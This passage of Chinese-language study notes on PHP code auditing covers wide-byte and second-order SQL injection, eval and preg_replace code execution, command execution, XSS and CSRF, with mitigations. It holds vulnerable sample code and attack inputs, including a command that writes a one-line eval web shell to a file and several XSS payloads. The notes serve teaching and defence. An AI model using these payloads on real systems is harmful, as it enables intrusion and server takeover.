<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">%df</span>'===&gt;<span class="symbol">%df</span><span class="symbol">%27</span> ==&gt;(addslashes)===&gt;<span class="symbol">%df</span><span class="symbol">%5</span><span class="keyword">c</span><span class="symbol">%27</span>===&gt;(GBK)===&gt;運'</span><br></pre></td></tr></table></figure>

<p>修复方案，</p>
<p>使用mysql_set_charset(GBK)指定字符集</p>
<p>使用mysql_real_escape_string进行转义</p>
<p>二次注入：注入点因为经过过滤处理，无法触发SQL注入漏洞，比如addslashes函数，将单引号转义，但是存进数据库后又被还原，在这种情况下，如果发现一个新的注入同时应用了被插入的数据库数据，就可以实现闭合新发现的注入漏洞引发二次注入</p>
<p>先存进去，再查询，被转义的字符在存入数据库时转义消除，再查询，利用数据库中已经被存进去并且不存在转义的代码二次查询。</p>
<p>漏洞存在于先注册、留言板（写入脏数据）再查询、update（利用脏数据）系统</p>
<h3 id="代码执行漏洞"><a href="#代码执行漏洞" class="headerlink" title="代码执行漏洞"></a>代码执行漏洞</h3><p>eval 将字符串 转化成代码，</p>
<p>思路：用户能够控制函数的输入，存在可执行代码的危险函数</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">常见危险函数：</span><br><span class="line"><span class="keyword">eval</span>函数	assert函数	</span><br><span class="line">动态函数执行</span><br><span class="line">preg_replace函数	</span><br><span class="line">回调函数</span><br><span class="line">写入文件+包含文件</span><br></pre></td></tr></table></figure>

<p>回调函数</p>
<p><img src="/2019/07/18/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/1563259300240.png" alt="1563259300240"></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">callBack</span><span class="params">()</span></span>&#123;</span><br><span class="line">    $b = $_GET[<span class="string">'cmd'</span>];</span><br><span class="line">    <span class="keyword">eval</span>($b);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">call_user_func(funtion: <span class="string">'callBack'</span>,$b);</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$b = <span class="string">"phpinfo()"</span>;</span><br><span class="line">call_user_func($_GET[<span class="string">'a'</span>],$b);	<span class="comment">//第一个参数用于回调，传入危险函数</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&gt;&gt;a = <span class="keyword">eval</span> <span class="keyword">or</span> assert</span><br></pre></td></tr></table></figure>

<p>动态函数执行</p>
<p>1.定义一个函数</p>
<p>2.将函数名（字符串）赋值给一个变量</p>
<p>3.使用变量名代替函数名 动态调用函数    //php的函数可由字符串拼接</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$_GET[<span class="string">'A'</span>]($_GET[<span class="string">'B'</span>])；</span><br><span class="line"></span><br><span class="line">&gt;&gt;A=assert&amp;b=phpinfo();</span><br></pre></td></tr></table></figure>

<p>preg_match_all(/$str1/,$str2,$str3)        str1为标准    str2为待匹配    str3为用于存入匹配字符的数组</p>
<p>正则表达式</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">正则表达语法规则</span><br><span class="line">限定符</span><br><span class="line">边界限制符</span><br><span class="line">后向引用</span><br><span class="line">普通字符作为原子	</span><br><span class="line">特殊符号作为原子	注意转义</span><br><span class="line">通用字符类型作为原子</span><br><span class="line">自定义原子表作为原子</span><br></pre></td></tr></table></figure>

<p>通用字符</p>
<p><img src="/2019/07/18/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/1563260759584.png" alt="1563260759584"></p>
<p>自定义原子</p>
<p>$pattern1 = ‘/[aj]sp’    //匹配asp or jsp</p>
<p>限定符</p>
<p>‘/go=gle/‘            匹配前面（’o‘）出现的原子次数0次或1次或多次    </p>
<p>‘/go+gle/‘            匹配前面（’o‘）出现的原子次数1次或多次    </p>
<p>/go?gle/                匹配前面（’o‘）出现的原子次数0次或1次    </p>
<p>边界限定符</p>
<p>‘/^abc/‘            以abc开头</p>
<p>‘/abc$/‘            以abc结尾</p>
<p>‘/^abc$/‘            只匹配abc</p>
<p>反向引用</p>
<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">'/<span class="tag">\<span class="name">d</span><span class="string">&#123;4&#125;</span></span>(-)<span class="tag">\<span class="name">d</span><span class="string">&#123;2&#125;</span></span><span class="tag">\<span class="name">\</span></span>1<span class="tag">\<span class="name">d</span><span class="string">&#123;2&#125;</span></span>/';		<span class="tag">\<span class="name">d</span></span>数字，&#123;4&#125;；4个；<span class="tag">\<span class="name">\</span></span>1，代表第一个括号的内容</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">preg_replace（$pattern,$replacement,subject）</span><br><span class="line">pattern 	正则匹配的内容	</span><br><span class="line">replacement		用于替换的内容</span><br><span class="line">subject		要进行搜索和替换的内容</span><br></pre></td></tr></table></figure>

<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">第一个参数</span><br><span class="line">$cmd = $_GET[<span class="string">'cmd'</span>];</span><br><span class="line">$str = <span class="string">'&lt;php&gt;phpinfo()&lt;/php&gt;'</span>;</span><br><span class="line">preg_replace(<span class="string">"/&lt;php&gt;(.*?)$cmd"</span>,<span class="string">"\\1"</span>,$str1)</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;</span>cmd = &lt;\/php&gt;<span class="regexp">/e			#	(.*?)-&gt;任意字符		/e</span>模式下执行replacement代码</span><br><span class="line"></span><br><span class="line">第二个参数</span><br><span class="line">preg_replace(<span class="string">"/php/e"</span>,$_GET[<span class="string">'cmd'</span>],’php‘);			<span class="comment">#执行cmd内容</span></span><br><span class="line"><span class="meta">&gt;&gt;</span>cmd = cat /flag				<span class="comment">#大概是永远不会出现</span></span><br><span class="line"></span><br><span class="line">第三个参数</span><br><span class="line">$str = $_GET[<span class="string">'cmd'</span>];</span><br><span class="line">preg_replace(<span class="string">"/\[php\](.*?)\[\/php\]/e"</span>,\\<span class="number">1</span>,$str)</span><br><span class="line"></span><br><span class="line">思路：让cmd传过来的值与pattern相匹配，执行replacement</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;</span>[php]cat /flag[<span class="regexp">/php]</span></span><br></pre></td></tr></table></figure>

<p>修复方案：</p>
<p>尽量不要执行外部的应用程序或命令            #不用/e</p>
<p>使用自定义函数或函数库来替代外部应用程序或命令的功能</p>
<p>使用escappeshellarg函数来处理命令的函数        #用户出来的参数都是有害的</p>
<p>使用safe_mode_exec_dir来制定可执行的文件路径</p>
<p>将执行函数的参数做白名单限制，在代码或配置文件中限制某些参数    #禁止使用某些函数（源代码也不能使用）</p>
<h3 id="命令执行漏洞"><a href="#命令执行漏洞" class="headerlink" title="命令执行漏洞"></a>命令执行漏洞</h3><p>输入验证不足导致。其目标是通过易受攻击的应用程序在主机操作系统上执行任意命令</p>
<p>挖掘思路，</p>
<p>用户能够控制函数输入</p>
<p>存在可执行代码的危险函数</p>
<p>代码执行：执行的效果完全受限于语言本身</p>
<p>命令执行：不受限于语言与法本身，不受命令限制</p>
<p>命令执行的类型</p>
<p>代码层过滤不严</p>
<p>系统的漏洞造成命令注入</p>
<p>调用的第三方组件存在代码执行漏洞</p>
<p>常见的危险函数</p>
<p>string system(string $command[,int return_var])        </p>
<p>cmd = echo 111&gt;1.txt  </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd = <span class="keyword">echo</span> <span class="meta">&lt;?php</span> @<span class="keyword">eval</span>[$_POST[<span class="string">'a'</span>]];<span class="meta">?&gt;</span>	&gt; <span class="number">1.</span>php	   [菜刀]</span><br></pre></td></tr></table></figure>

<p>passthru</p>
<p>//这两个函数有回显</p>
<p>学习windows 系统命令</p>
<figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">string</span> <span class="keyword">exec</span>（<span class="keyword">string</span> $command[,array $output[,<span class="keyword">int</span> $return_var]]）</span><br></pre></td></tr></table></figure>

<p>输出填充output数组</p>
<p>状态写入return_var变量</p>
<p>这个函数无回显，echo 也只回显一行</p>
<p>string shell_exec(string $cmd)</p>
<p>无回显，echo回显所有</p>
<p>cmd = dir &gt; 4.txt      将内容写入文件</p>
<p>反引号（`） 等于shell_exec()</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$cmd = $_GET[<span class="string">'cmd'</span>];		&lt;&lt; cmd=ipconfig</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;pre&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> shell_exec($cmd);</span><br></pre></td></tr></table></figure>

<p>过滤函数</p>
<p>escapeshellcmd ( string <code>$command</code> ) : string        过滤整条命令</p>
<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">反斜线（<span class="symbol">\）</span>会在以下字符之前插入： &amp;#;`|*?~&lt;&gt;^()[]&#123;&#125;$<span class="symbol">\,</span> <span class="symbol">\x</span>0A 和 <span class="symbol">\x</span>FF。 ' 和 " 仅在不配对儿的时候被转义。 在 Windows 平台上，所有这些字符以及 <span class="variable">% 和 ! 字符都会被空格代替</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$cmd = escapeshellcmd($_GET[<span class="string">'cmd'</span>]);		&lt;&lt; cmd=<span class="keyword">echo</span> <span class="number">5555</span> &gt; <span class="number">5.</span>txt   &gt;&gt;  <span class="number">5555</span>   <span class="number">5.</span>txt</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;pre&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> shell_exec($cmd);</span><br></pre></td></tr></table></figure>

<p>Escapeshellarg()    过滤参数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">对于单个单引号, escapeshellarg 函数转义后,还会在左右各加一个单引号,但 escapeshellcmd 函数是直接加一个转义符，对于成对的单引号, escapeshellcmd 函数默认不转义,但 escapeshellarg 函数转义:</span><br></pre></td></tr></table></figure>

<p>修复方案：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">尽量少用执行命令的函数，或者直接禁用，参数值尽量使用引号包括</span><br><span class="line"></span><br><span class="line">在使用动态函数之前，确保使用的函数式指定的函数之一	（白名单）</span><br><span class="line"></span><br><span class="line">在进入执行命令的函数，方法前，对参数进行过滤，对敏感字符进行转义</span><br><span class="line"></span><br><span class="line">对于可控点是程序参数的情况下，使用escapeshellcmd函数过滤；对于可控点是程序参数值得情况下，使用escapeshellarg函数进行过滤</span><br><span class="line"></span><br><span class="line">参数的值尽量使用引号包裹，并且在拼接前用addslashes进行转义</span><br></pre></td></tr></table></figure>

<h3 id="XSS漏洞"><a href="#XSS漏洞" class="headerlink" title="XSS漏洞"></a>XSS漏洞</h3><p>跨站脚本攻击，攻击者利用网站程序对用户输入过滤不足，输入可以显示在页面上对其他用户造成影响的HTML代码，从而盗取用户资料、利用用户身份惊醒某种动作或者对访问者进行病毒侵害的一种攻击方式</p>
<p>蠕虫、盗取cookie、跳转钓鱼网页、查看网页浏览信息</p>
<p>挖掘思路：没有过滤参数，传入到输出函数中</p>
<p>漏洞思路：搜索内容、发表文章、留言、评论回复、资料设置</p>
<p>漏洞类型：反射型；存储型；DOM型</p>
<p><img src="/2019/07/18/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/1563282310170.png" alt="1563282310170"></p>
<p>常见场景：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">//直接输出到浏览器页面	</span></span><br><span class="line">    $content = $_GET[<span class="string">'content'</span>];</span><br><span class="line">	<span class="keyword">echo</span> $content;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    <span class="comment">//直接输出到HTML标签</span></span><br><span class="line">&lt;input type = <span class="string">'text'</span> value=<span class="string">"&lt;?php echo $content?&gt;"</span>&gt;</span><br><span class="line">    <span class="comment">//直接输出到&lt;script&gt;标签</span></span><br><span class="line"> 	$content = $_GET[<span class="string">'content'</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;script&gt;</span><br><span class="line">    <span class="keyword">var</span> xss = <span class="string">'&lt;?phpe cho $content ?&gt;'</span>;</span><br><span class="line">	document.write(xss);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">将前端获取的内容，直接输出到浏览器页面		?content=123<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="regexp">/xss/</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">HTML标签		先闭合标签	?content=123"&gt;<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="regexp">/xss/</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>标签		先闭合单引号、再闭合标签		?content=123';<span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="regexp">/xss/</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2019/07/18/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/1563283530673.png" alt="1563283530673">（感觉有点像二次注入，被搜索时触发，管理员刷新留言板时）</p>
<p>（XSS平台）</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$xss = $_POST[<span class="string">'xss'</span>];</span><br><span class="line">$connection = mysql_connect(<span class="string">"localhost"</span>,<span class="string">"root"</span>,<span class="string">"root"</span>);</span><br><span class="line">mysql_select_db(<span class="string">'xss'</span>,$connection);</span><br><span class="line"><span class="keyword">if</span> ($xss !==<span class="keyword">null</span>)&#123;</span><br><span class="line">    $sql = <span class="string">"INSET INTO xss(id.payload) VALUES('1','$xss');"</span>;</span><br><span class="line">    $result = mysql_query($sql) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"fail"</span>.mysql_error());</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;form action=<span class="string">""</span> method =<span class="string">"post"</span>&gt;</span><br><span class="line">    &lt;input type =<span class="string">"text"</span> name=<span class="string">"xss"</span>&gt;</span><br><span class="line">    &lt;input type = <span class="string">"submit"</span> value=<span class="string">"submit"</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$connect = mysql_connect(<span class="string">"localhost"</span>,<span class="string">"root"</span>,<span class="string">"root"</span>);</span><br><span class="line">mysql_select_db(<span class="string">'xss'</span>,$connection);</span><br><span class="line">$sql = <span class="string">"select payload from xss where id = 1"</span>;</span><br><span class="line">$result = mysql_query($sql);</span><br><span class="line"><span class="keyword">while</span>($row = mysql_fetch_array($result))&#123;</span><br><span class="line">    <span class="keyword">echo</span> $row[<span class="string">'payload'</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;	<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="regexp">/XSS/</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2019/07/18/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/1563284488840.png" alt="1563284488840"></p>
<p><img src="/2019/07/18/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/1563284525211.png" alt="1563284525211"></p>
<p>DOM可为存储型，可为反射型</p>
<figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">DOM</span>型<span class="type">XSS</span>其实是一种特殊类型的反射型<span class="type">XSS</span>，它是基于<span class="type">DOM</span>文档对象模型的一种漏洞。在网站页面中有许多页面的元素，当页面到达浏览器时浏览器会为页面创建一个顶级的<span class="type">Document</span> <span class="class"><span class="keyword">object</span><span class="title">文档对象，接着生成各个子文档对象，每个页面元素对应一个文档对象，每个文档对象包含属性、方法和事件。</span></span></span><br><span class="line"><span class="class"><span class="title">可以通过JS脚本对文档对象进行编辑从而修改页面的元素。</span></span></span><br><span class="line"><span class="class"><span class="title">也就是说，客户端的脚本程序可以通过DOM来动态修改页面内容，从客户端获取DOM中的数据并在本地执行。基于这个特性，就可以利用JS脚本来实现XSS漏洞的利用。</span></span></span><br></pre></td></tr></table></figure>

<p>修改了HTML内容，从而执行了XSS</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$xss = $_GET[<span class="string">'XSS'</span>];</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span> =<span class="string">"text"</span> <span class="attr">id</span>=<span class="string">"text"</span> <span class="attr">value</span>=<span class="string">"&lt;?php echo $xss;?&gt;"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span> =<span class="string">"print"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span> =<span class="string">"text/javascript"</span>&gt;</span></span><br><span class="line"><span class="javascript">	<span class="keyword">var</span> text = <span class="built_in">document</span>.getElementById(<span class="string">"text"</span>);</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> print = <span class="built_in">document</span>.getElementById(<span class="string">"print"</span>);</span></span><br><span class="line">    print.innerHTML = text.value;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt; ?xss = <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span> = <span class="string">alert(/xss/)</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">修改后：</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">"text"</span> <span class="attr">value</span>=<span class="string">"&lt;img src=x onerror = alert(/xss/)&gt;"</span> <span class="attr">type</span> =<span class="string">"text"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span> =<span class="string">"print"</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"x"</span> <span class="attr">onerror</span> = <span class="string">"alert(/xss/)"</span>"&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span> =<span class="string">"text/javascript"</span>&gt;</span></span><br><span class="line"><span class="javascript">	<span class="keyword">var</span> text = <span class="built_in">document</span>.getElementById(<span class="string">"text"</span>);</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> print = <span class="built_in">document</span>.getElementById(<span class="string">"print"</span>);</span></span><br><span class="line">    print.innerHTML = text.value;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>DOM-XSS 的 数据流向是： URL–&gt;浏览器</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">DOM型XSS的防御方法：DOM型XSS主要是由客户端的脚本通过DOM动态地输出数据到页面而不是依赖于将数据提交给服务器端，而从客户端获得DOM中的数据在本地执行，因而仅从服务器端是无法防御的。其防御在于：（<span class="number">1</span>） 避免客户端文档重写、重定向或其他敏感操作，同时避免使用客户端数据，这些操作尽量在服务器端使用动态页面来实现；</span><br><span class="line">（<span class="number">2</span>） 分析和强化客户端JS代码，特别是受到用户影响的DOM对象，注意能直接修改DOM和创建HTML文件的相关函数或方法，并在输出变量到页面时先进行编码转义，如输出到HTML则进行HTML编码、输出到则进行JS编码。</span><br><span class="line">https:<span class="regexp">//</span>www.jianshu.com<span class="regexp">/p/</span><span class="number">190</span>dedd585f2</span><br></pre></td></tr></table></figure>

<p>XSS修复方案</p>
<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">对所有输入中的<span class="keyword">script</span>、iframe等字样进行严格的检查</span><br><span class="line"></span><br><span class="line">验证数据的类型及其格式、长度、范围和内容</span><br><span class="line"></span><br><span class="line">客户端做数据的验证与过滤，关键的过滤步骤在服务端进行</span><br><span class="line"></span><br><span class="line">检查输出的数据</span><br></pre></td></tr></table></figure>

<h3 id="CSRF漏洞（最容易被忽略）"><a href="#CSRF漏洞（最容易被忽略）" class="headerlink" title="CSRF漏洞（最容易被忽略）"></a>CSRF漏洞（最容易被忽略）</h3><p>跨站请求伪造。</p>
<p>黑客伪造用户的HTTP请求，将这个请求发送给存在CSRF的网站，有CSRF的网站执行了伪造的HTTP请求，就引发了跨站请求伪造。</p>
<p>漏洞危害</p>
<p>攻击者盗用你的身份信息，以你的名义发送恶意请求，发送邮件、消息，盗取账号，购买商品，虚拟货币转账。        -&gt;个人隐私泄露和财产安全。</p>
<p>漏洞本质</p>
<p>攻击者获取到重要参数，成功构造一个伪造请求</p>
<p>挖掘思路</p>
<p>后台功能模块：管理后台，会员中心、添加用户</p>
<p>被引用的核心文件里没有验证token和referer相关的代码</p>
<p>没有token：可以直接请求这个页面</p>
<p>没带referer：返回相同的数据</p>
<p>任意用户注册代码案例：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">目标存在CSRF漏洞</span><br><span class="line">受害者需要保持目标站点的活跃状态</span><br><span class="line">受害者需要点击钓鱼链接</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$conn = mysql_connect(<span class="string">"localhost"</span>,<span class="string">"root"</span>,<span class="string">"root"</span>);</span><br><span class="line">mysql_select_db(admin,$conn);</span><br><span class="line">mysql_query(<span class="string">"SET NAMES GB2332"</span>);</span><br></pre></td></tr></table></figure>

<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span></span></span><br><span class="line">              &lt;title&gt;用户登录&lt;/head&gt;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span> =<span class="string">"login.php"</span> <span class="attr">method</span>=<span class="string">"post"</span>&gt;</span></span><br><span class="line">            用户名：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"usename"</span>&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line">            密码：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"password"</span> <span class="attr">name</span>=<span class="string">"password"</span>&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span> =<span class="string">"submit"</span> <span class="attr">name</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"点击登录"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

